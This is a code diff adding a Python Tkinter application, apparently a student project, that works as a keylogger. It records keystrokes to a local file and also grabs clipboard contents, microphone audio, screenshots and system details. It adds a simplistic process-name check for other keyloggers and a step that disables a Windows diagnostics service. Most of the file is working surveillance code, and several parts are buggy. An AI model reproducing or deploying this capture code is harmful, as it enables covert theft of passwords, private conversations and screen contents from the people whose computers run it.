@@ -1,0 +1,222 @@
+import tkinter as tk
+from pynput.keyboard import Key, Listener
+import time
+from PIL import ImageGrab
+import win32clipboard
+import sounddevice as sd
+from scipy.io.wavfile import write
+import platform
+import socket
+import threading
+from reportlab.lib.pagesizes import letter
+from reportlab.pdfgen import canvas
+import os
+import subprocess
+import keyboard
+from cryptography.fernet import Fernet
+
+key = Fernet.generate_key()
+cipher = Fernet(key)
+
+class KeyloggerGUI:
+    def __init__(self):
+        # Your existing variables and initialization here
+        self.system_information = "sysinfo.txt"
+        self.keys_information = "key_log.txt"
+        self.clipboard_information = "Clipboard.txt"
+        self.audio_information = "audio.wav"
+        self.screenshot_information = "screenshot.png"
+        self.keys = []
+        self.count = 0
+        self.microphone_time = 10
+        self.time_iteration = 15
+        self.number_of_iterations_end = 3
+        self.file_path = "C:\\Users\\User\\OneDrive\\Desktop\\Natasha\\Keylogger System (1)\\Keylogger System"
+        self.extend = "\\"
+        self.file_merge = self.file_path + self.extend
+
+        # Initialize GUI
+        self.root = tk.Tk()
+        self.root.title("Keylogger GUI")
+
+        self.start_button = tk.Button(self.root, text="Start Keylogger", command=self.start_logging)
+        self.start_button.pack()
+
+        self.quit_button = tk.Button(self.root, text="Quit", command=self.root.destroy)
+        self.quit_button.pack()
+
+        self.status_label = tk.Label(self.root, text="Keylogger Not Started", fg="red")
+        self.status_label.pack()
+
+        self.listener = None
+
+    # Shows the information of the user's system
+    def computer_information(self):
+        self.status_label.config(text="Gathering System Information...", fg="blue")
+        with open(self.file_path + self.extend + self.system_information, "a") as f:
+            hostname = socket.gethostname()
+            IPAddr = socket.gethostbyname(hostname)
+            
+            f.write("Processor: " + (platform.processor()) + '\n')
+            f.write("System: "+  platform.system() + " " + platform.version() + '\n')
+            f.write("Machine:" + platform.machine() +  "\n")
+            f.write("Hostname: " + hostname + "\n")
+            f.write("Private IP Address: " + IPAddr + "\n")
+        
+        self.status_label.config(text="System Information Collected", fg="green")
+
+    def detect_keylogger(self):
+        self.status_label.config(text="Detecting Keylogger...", fg="blue")
+        with open(self.file_path + self.extend + self.system_information, "a") as f:
+            # Check for common keylogger processes
+            keylogger_processes = ["keylogger.exe", "keylog.exe", "keytrap.exe"]
+            for process in keylogger_processes:
+                try:
+                    output = subprocess.check_output(["tasklist", "/FI", f"IMAGENAME eq {process}"])
+                    if output:
+                        print(f"Potential keylogger process detected: {process}")
+                except subprocess.CalledProcessError:
+                    print(f"Potential keylogger not detected")
+                pass
+
+        self.status_label.config(text="Detecting Keylogger Complete", fg="green")
+
+    def protect_against_keyloggers(self):
+        self.status_label.config(text="Protecting Keylogger...", fg="blue")
+        with open(self.file_path + self.extend + self.system_information, "a") as f:
+            subprocess.run(["sc", "config", "DiagTrack", "start=", "disabled"])
+            
+        print("Keylogger protection enabled")
+
+    def encrypt_keystrokes(event):
+        # Get the pressed key
+        key = event.name.encode()
+
+        # Encrypt the key using the cipher
+        encrypted_key = cipher.encrypt(key)
+
+        # Print the encrypted key
+        print(encrypted_key)
+
+    def copy_clipboard(self):
+        self.status_label.config(text="Copying Clipboard Data...", fg="blue")
+        with open(self.file_path + self.extend + self.clipboard_information, "a") as f:
+            try:
+                win32clipboard.OpenClipboard()
+                pasted_data = win32clipboard.GetClipboardData()
+                win32clipboard.CloseClipboard()
+                f.write("Clipboard Data: \n" + pasted_data) 
+            except:
+                f.write("Clipboard could not be copied")
+        
+        self.status_label.config(text="Clipboard Data Copied", fg="green")
+
+    def microphone(self):
+        self.status_label.config(text="Recording Audio...", fg="blue")
+        fs = 44100
+        seconds = self.microphone_time
+        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
+        sd.wait()
+        write(self.file_path + self.extend + self.audio_information, fs, myrecording)
+
+        self.status_label.config(text="Audio Recorded", fg="green")
+
+    def screenshot(self):
+        self.status_label.config(text="Taking Screenshot...", fg="blue")
+        im = ImageGrab.grab()
+        im.save(self.file_path + self.extend + self.screenshot_information)
+        self.status_label.config(text="Screenshot Taken", fg="green")
+
+    def write_file(self, keys):
+        self.status_label.config(text="Writing Key Log...", fg="blue")
+        with open(self.file_path + self.extend + self.keys_information, "a") as f:
+            for key in keys:
+                k = str(key).replace("'", "")
+                if k.find("space") > 0:
+                    f.write('\n')
+                elif k.find("Key") == -1:
+                    f.write(k)
+        self.status_label.config(text="Key Log Written", fg="green")
+
+    def start_logging(self):
+        self.status_label.config(text="Keylogger Not Started", fg="red")
+        self.status_label.pack()
+
+        self.computer_info_button = tk.Button(self.root, text="Gather System Info", command=self.computer_information)
+        self.computer_info_button.pack()
+        
+        self.detect_keylogger_button = tk.Button(self.root, text="Detect Keylogger", command=self.detect_keylogger)
+        self.detect_keylogger_button.pack()
+
+        self.copy_clipboard_button = tk.Button(self.root, text="Copy Clipboard", command=self.copy_clipboard)
+        self.copy_clipboard_button.pack()
+
+        self.microphone_button = tk.Button(self.root, text="Record Audio", command=self.microphone)
+        self.microphone_button.pack()
+
+        self.write_keys_button = tk.Button(self.root, text="Write Key Log", command=self.write_file)
+        self.write_keys_button.pack()
+
+        self.screenshot_button = tk.Button(self.root, text="Take Screenshot", command=self.screenshot)
+        self.screenshot_button.pack()
+
+        self.protect_against_keyloggers_button = tk.Button(self.root, text="Enable Prevention", command=self.protect_against_keyloggers)
+        self.protect_against_keyloggers_button.pack()
+
+        self.quit_button.pack()
+        self.status_label.config(text="Keylogger Started", fg="green")
+        threading.Thread(target=self.start_keylogger).start()
+
+    def stop_logging(self):
+        self.status_label.config(text="Keylogger Stopped", fg="red")
+        if self.listener:
+            self.listener.join()
+
+        self.root.destroy()
+
+    def start_keylogger(self):
+        number_of_iterations = 0
+        currentTime = time.time()
+        stoppingTime = time.time() + self.time_iteration
+
+        while number_of_iterations < self.number_of_iterations_end:
+            self.count = 0  # Reset count within the loop
+
+            def on_press(key):
+                global currentTime
+                print(key)
+                self.keys.append(key)
+                self.count += 1  # Increment self.count
+                currentTime = time.time()
+
+                if self.count >= 1:
+                    self.count = 0
+                    self.write_file(self.keys)
+                    self.keys = []
+
+            def on_release(key):
+                if key == Key.esc:
+                    return False
+                if currentTime > stoppingTime:
+                    return False
+
+            with Listener(on_press=on_press, on_release=on_release) as listener:
+                listener.join()
+
+            if currentTime > stoppingTime:
+                with open(self.file_path + self.extend + self.keys_information, "w") as f:
+                    f.write(" ")
+
+                self.screenshot()
+                self.copy_clipboard()
+                number_of_iterations += 1
+                currentTime = time.time()
+                stoppingTime = time.time() + self.time_iteration
+
+    def run(self):
+        self.computer_information()
+        self.root.mainloop()
+
+# Instantiate the KeyloggerGUI class and run the application
+keylogger_app = KeyloggerGUI()
+keylogger_app.run()
